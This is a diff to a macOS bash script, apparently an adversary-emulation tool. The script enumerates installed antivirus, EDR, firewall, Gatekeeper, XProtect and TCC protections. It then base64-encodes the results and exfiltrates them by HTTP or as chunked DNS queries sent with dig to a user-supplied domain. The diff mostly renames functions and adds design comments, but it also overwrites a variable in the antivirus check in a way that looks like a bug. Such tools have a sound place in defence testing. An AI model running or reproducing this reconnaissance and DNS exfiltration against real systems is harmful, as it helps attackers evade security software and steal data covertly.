@@ -257,6 +257,7 @@ get_timestamp() {
 
 log_to_stdout() {
     local msg="$1"
+    
     local function_name="$2"
     local command="$3"
     local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
@@ -269,13 +270,13 @@ log_to_stdout() {
     fi
 }
 
-check_av() {
+discover_av() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
         "ps")
-            log_to_stdout "Checked antivirus processes" "check_av" "$CMD_PS"
+            
             for entry in "${AV_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
@@ -287,7 +288,7 @@ check_av() {
             done
             ;;
         "files")
-            log_to_stdout "Checked antivirus files" "check_av" "$CMD_LS_APP_FILES"
+            log_to_stdout "Checked antivirus files" "discover_av" "$CMD_LS_APP_FILES"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_files "$app_name")
                 if [ -n "$result" ]; then
@@ -296,7 +297,7 @@ check_av() {
             done
             ;;
         "dir")
-            log_to_stdout "Checked antivirus directories" "check_av" "$CMD_LS_APP_DIR"
+            log_to_stdout "Checked antivirus directories" "discover_av" "$CMD_LS_APP_DIR"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$app_name")
                 if [ -n "$result" ]; then
@@ -305,9 +306,9 @@ check_av() {
             done
             ;;
         "info")
-            log_to_stdout "Checked antivirus info" "check_av" "$CMD_SP_APP"
+            log_to_stdout "Checked antivirus info" "discover_av" "$CMD_SP_APP"
             for app_name in "${AV_VENDOR_APP[@]}"; do
-                if app_path=$(cmd_ls_app_dir "$app_name"); then
+                if app_name=$(cmd_ls_app_dir "$app_name"); then
                     app_name_colon="${app_name/.app/:}"
                     result=$(cmd_sp_app "$app_name_colon")
                     if [ -n "$result" ]; then
@@ -324,13 +325,13 @@ check_av() {
     echo "$output"
 }
 
-check_edr() {
+discover_edr() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
         "ps")
-            log_to_stdout "Checked EDR processes" "check_edr" "$CMD_PS"
+            log_to_stdout "Checked EDR processes" "discover_edr" "$CMD_PS"
             for entry in "${EDR_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
@@ -342,7 +343,7 @@ check_edr() {
             done
             ;;
         "files")
-            log_to_stdout "Checked EDR files" "check_edr" "$CMD_LS_APP_FILES"
+            log_to_stdout "Checked EDR files" "discover_edr" "$CMD_LS_APP_FILES"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_files "$edr_name")
                 if [ -n "$result" ]; then
@@ -351,7 +352,7 @@ check_edr() {
             done
             ;;
         "dir")
-            log_to_stdout "Checked EDR directories" "check_edr" "$CMD_LS_APP_DIR"
+            log_to_stdout "Checked EDR directories" "discover_edr" "$CMD_LS_APP_DIR"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$edr_name")
                 if [ -n "$result" ]; then
@@ -360,7 +361,7 @@ check_edr() {
             done
             ;;
         "info")
-            log_to_stdout "Checked EDR info" "check_edr" "$CMD_SP_APP"
+            log_to_stdout "Checked EDR info" "discover_edr" "$CMD_SP_APP"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                     edr_name_colon="${edr_name/.app/:}"
@@ -379,13 +380,13 @@ check_edr() {
     echo "$output"
 }
 
-check_ost() {
+discover_ost() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
         "ps")
-            log_to_stdout "Checked OST processes" "check_ost" "$CMD_PS"
+            log_to_stdout "Checked OST processes" "discover_ost" "$CMD_PS"
             for entry in "${OST_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
@@ -397,7 +398,7 @@ check_ost() {
             done
             ;;
         "files")
-            log_to_stdout "Checked OST files" "check_ost" "$CMD_LS_APP_FILES"
+            log_to_stdout "Checked OST files" "discover_ost" "$CMD_LS_APP_FILES"
             for ost_name in "${OST_APP[@]}"; do
                 result=$(cmd_ls_app_files "$ost_name")
                 if [ -n "$result" ]; then
@@ -406,7 +407,7 @@ check_ost() {
             done
             ;;
         "dir")
-            log_to_stdout "Checked OST directories" "check_ost" "$CMD_LS_APP_DIR"
+            log_to_stdout "Checked OST directories" "discover_ost" "$CMD_LS_APP_DIR"
             for ost_name in "${OST_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$ost_name")
                 if [ -n "$result" ]; then
@@ -415,7 +416,7 @@ check_ost() {
             done
             ;;
         "info")
-            log_to_stdout "Checking OST info" "check_ost" "$CMD_SP_APP"
+            log_to_stdout "Checking OST info" "discover_ost" "$CMD_SP_APP"
             
             for ost_name in "${OST_APP[@]}"; do
                 if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
@@ -498,7 +499,7 @@ chunk_data() {
     echo "$output"
 }
 
-exfiltrate_http() {
+exfil_http() {
     local data="$1"
     local url="$2"
     local og_ttp="$TTP_ID"
@@ -529,7 +530,7 @@ exfiltrate_http() {
     return 0
 }
 
-exfiltrate_dns() {
+exfil_dns() {
     local data="$1"
     local domain="$2"
     local id="$3"
@@ -540,11 +541,11 @@ exfiltrate_dns() {
     local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
     local dns_chunk_size=63  # Fixed max length of a DNS label
 
-    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
+    log_to_stdout "Attempting to exfiltrate data via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
 
     # Send the ID first
     if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
-        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
+        log_to_stdout "Failed to send ID via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
         TTP_ID=$original_ttp_id
         return 1
     fi
@@ -555,9 +556,9 @@ exfiltrate_dns() {
 
     echo "$chunks" | while IFS= read -r chunk; do
         if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
-            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
         else
-            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
             TTP_ID=$original_ttp_id
             return 1
         fi
@@ -565,11 +566,11 @@ exfiltrate_dns() {
     done
 
     if dig +short "end.$domain" A > /dev/null; then
-        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
+        log_to_stdout "Successfully completed DNS exfiltration" "exfil_dns" "dig +short end.$domain"
         TTP_ID=$original_ttp_id
         return 0
     else
-        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
+        log_to_stdout "Failed to send end signal via DNS" "exfil_dns" "dig +short end.$domain"
         TTP_ID=$original_ttp_id
         return 1
     fi
@@ -651,6 +652,183 @@ while [ "$#" -gt 0 ]; do
     shift
 done
 
+# ASSUMPTIONS:
+# - Global variables are properly set based on user input
+# - Utility functions (validate_*, encode_output, encrypt_output, etc.) are defined elsewhere
+# - discover_*() functions handle their own logging within their execution
+
+# PURPOSE:
+# Orchestrate security checks, process output, and exfiltrate data based on user-defined flags
+
+# REQUIREMENTS:
+# - Implement main() as a high-level orchestrator
+# - Use global variables as execution switches
+# - Centralize logging and exfiltration logic in main()
+# - Execute utility functions within main() based on global variables and Logic flow
+# - Follow the specified execution priority order
+
+
+# FUNCTION EXECUTION PRIORITY:
+# 1. Validation
+# 2. Technique Function Execution
+# 3. Output Processing
+# 4. Logging
+# 5. Exfiltration
+
+# FUNCTION EXECUTION LOGIC FLOW:
+# 1. Validation
+#       Required logic flow:
+#       if (EXFIL && EXFIL_METHOD == "dns")
+#           validate_dns()
+#       if (ENCODE)
+#           validate_encoding()
+#       if (ENCRYPT)
+#           validate_encryption()
+#       if (CHUNK_SIZE)
+#           validate_chunk_size()
+#       if (SUDO_MODE)
+#           validate_sudo_mode()
+#       if (VERBOSE)
+#           validate_verbose_mode()
+#       validate_security_checks()
+#       if (LOG_ENABLED)
+#           validate_log_enabled()
+
+# 2. Technique Function Execution
+#       if (EDR)    
+#           discover_edr()
+#       if (AV)
+#           discover_av()
+#       if (FIREWALL)
+#           discover_firewall()
+#       if (MRT)
+#           discover_mrt()
+#       if (GATEKEEPER)
+#           discover_gatekeeper()
+#       if (XPROTECT)
+#           discover_xprotect()
+#       if (TCC)
+#           discover_tcc()
+#       if (OST)
+#           discover_ost()
+#       if (HIDS)
+#           discover_hids()
+
+
+
+# 3. Output Processing
+# - Check if logging or exfiltration is enabled
+# - If logging is enabled, write output to log
+# - If exfiltration is enabled, exfiltrate the data
+# - If neither logging nor exfiltration is enabled, print to stdout
+
+#   Required logic flow:
+#       if (LOG_ENABLED || EXFIL)
+#           if (LOG_ENABLED)
+#               write output to log
+#           if (EXFIL)
+#               exfiltrate data
+#       else
+#           print output to stdout
+
+
+# FUNCTION VARIABLE MAP:
+# Function Execution Dependency Map:
+# This map outlines the conditional execution of functions based on global variables.
+# If the mapped global variable is true, the corresponding function executes.
+# If false, the function is skipped. This ensures efficient and targeted execution
+# of discovery techniques based on user-specified parameters.
+
+# 1. Validation Functions
+#   - validate_dns(): depends_on: EXFIL, EXFIL_METHOD
+#   - validate_encoding(): depends_on: ENCODE
+#   - validate_encryption(): depends_on: ENCRYPT, ENCRYPT_KEY
+#   - validate_chunk_size(): depends_on: CHUNK_SIZE
+#   - validate_sudo_mode(): depends_on: SUDO_MODE
+#   - validate_verbose_mode(): depends_on: VERBOSE
+#   - validate_security_checks(): depends_on: EDR, FIREWALL, HIDS, AV, GATEKEEPER, XPROTECT, MRT, TCC, OST
+#   - validate_log_enabled(): depends_on: LOG_ENABLED
+
+# 2. Technique Functions 
+#    Execute technique functions based on global variables
+
+#    - discover_edr(): depends_on: EDR
+#    - discover_av(): depends_on: AV
+#    - discover_firewall(): depends_on: FIREWALL
+#    - discover_mrt(): depends_on: MRT
+#    - discover_gatekeeper(): depends_on: GATEKEEPER
+#    - discover_xprotect(): depends_on: XPROTECT
+#    - discover_tcc(): depends_on: TCC
+#    - discover_ost(): depends_on: OST
+#    - discover_hids(): depends_on: HIDS [***MISSING VARIABLE MAP****]
+
+# 3. Output Processing Functions
+#    - Encode output (depends_on: ENCODE)
+#    - Encrypt output (depends_on: ENCRYPT)
+
+# 4. Logging and Exfiltration Functions
+#    - Log processed output (depends_on: LOG_ENABLED, EXFIL)
+#    - Exfiltrate data (depends_on: EXFIL, EXFIL_METHOD)
+
+# FUNCTION HIERARCHY AND INTEROPERABILITY:
+#
+# main()
+# |
+# ├─── 1. Validation
+# |    ├─── validate_dns()
+# |    |    └─── resolve_domain()
+# |    ├─── validate_encoding()
+# |    ├─── validate_encryption()
+# |    |    └─── check_openssl_availability()
+# |    ├─── validate_chunk_size()
+# |    ├─── validate_sudo_mode()
+# |    ├─── validate_verbose_mode()
+# |    ├─── validate_security_checks()
+# |    └─── validate_log_enabled()
+# |         └─── check_write_permissions()
+# |
+# ├─── 2. Technique Function Execution
+# |    ├─── discover_edr()
+# |    |    ├─── cmd_ps()
+# |    |    ├─── cmd_ls_app_files()
+# |    |    └─── cmd_sp_app()
+# |    ├─── discover_av()
+# |    |    ├─── cmd_ps()
+# |    |    ├─── cmd_ls_app_files()
+# |    |    └─── cmd_sp_app()
+# |    ├─── discover_firewall()
+# |    ├─── discover_mrt()
+# |    ├─── discover_gatekeeper()
+# |    ├─── discover_xprotect()
+# |    ├─── discover_tcc()
+# |    └─── discover_ost()
+# |         ├─── cmd_ps()
+# |         ├─── cmd_ls_app_files()
+# |         └─── cmd_sp_app()
+# |
+# ├─── 3. Output Processing
+# |    ├─── encode_output()
+# |    |    ├─── base64_encode()
+# |    |    └─── hex_encode()
+# |    └─── encrypt_output()
+# |         └─── openssl_encrypt()
+# |
+# └─── 4. Logging and Exfiltration
+#      ├─── log_to_stdout()
+#      ├─── log_to_file()
+#      |    └─── rotate_log()
+#      └─── exfil_data()
+#           ├─── exfil_http()
+#           |    └─── chunk_data()
+#           └─── exfil_dns()
+#                └─── create_dns_queries()
+
+
+
+
+
+
+
 main() {
     local output=""
     local encoded_output=""
@@ -658,6 +836,7 @@ main() {
         setup_log
     fi
 
+#TODO: move validate_DSNS logic to seperate function or to validate_DNS. 
     # Validate DNS early if exfiltration is requested
     if [ "$EXFIL" = true ]; then
         local domain
@@ -682,49 +861,49 @@ main() {
        [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ] || [ "$LOG_ENABLED" = true ]; then
         
         for av_tool in "${AV[@]}"; do
-            result=$(check_av "$av_tool")
+            result=$(discover_av "$av_tool")
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
 
         for ost_tool in "${OST[@]}"; do
-            result=$(check_ost "$ost_tool")
+            result=$(discover_ost "$ost_tool")
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
 
         for edr_tool in "${EDR[@]}"; do
-            result=$(check_edr "$edr_tool")
+            result=$(discover_edr "$edr_tool")
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
 
         if [ "$FIREWALL" = true ]; then
-            result=$(check_firewall)
+            result=$(discover_firewall)
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         fi
 
         for mrt_tool in "${MRT[@]}"; do
-            result=$(check_mrt "$mrt_tool")
+            result=$(discover_mrt "$mrt_tool")
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
 
         if [ "$GATEKEEPER" = true ]; then
-            result=$(check_gatekeeper)
+            result=$(discover_gatekeeper)
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         fi
 
         if [ "$XPROTECT" = true ]; then
-            result=$(check_xprotect)
+            result=$(discover_xprotect)
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         fi
 
         if [ "$TCC" = true ]; then
-            result=$(check_tcc)
+            result=$(discover_tcc)
             output+="$result"$'\n'
             [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         fi
@@ -736,24 +915,34 @@ main() {
     if [ -n "$output" ]; then
         if [ "$ENCODE" != "none" ]; then
             encoded_output=$(encode_output "$output")
-            echo "$encoded_output"
-            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$encoded_output" >> "$LOG_FILE"
-        else
-            echo "$output"
+        fi
+
+        if [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ]; then
+            if [ -n "$encoded_output" ]; then
+                echo "$encoded_output" >> "$LOG_FILE"
+            else
+                echo "$output" >> "$LOG_FILE"
+            fi
+        elif [ "$LOG_ENABLED" != true ]; then
+            if [ -n "$encoded_output" ]; then
+                echo "$encoded_output"
+            else
+                echo "$output"
+            fi
         fi
 
         if [ "$EXFIL" = true ]; then
-            local exfil_data=$([ "$ENCODE" != "none" ] && echo "$encoded_output" || echo "$output")
+            local exfil_data=$([ -n "$encoded_output" ] && echo "$encoded_output" || echo "$output")
             local b64_output=$(echo "$exfil_data" | base64)
             if [[ "$EXFIL_METHOD" == http://* ]]; then
-                exfiltrate_http "$b64_output" "$EXFIL_METHOD"
+                exfil_http "$b64_output" "$EXFIL_METHOD"
             elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                 local domain="${EXFIL_METHOD#dns=}"
-                exfiltrate_dns "$b64_output" "$domain" "$(date +%s)"
+                exfil_dns "$b64_output" "$domain" "$(date +%s)"
             fi
         fi
     else
-        echo "No security software information found"
+        [ "$LOG_ENABLED" != true ] && echo "No security software information found"
     fi
 }
 
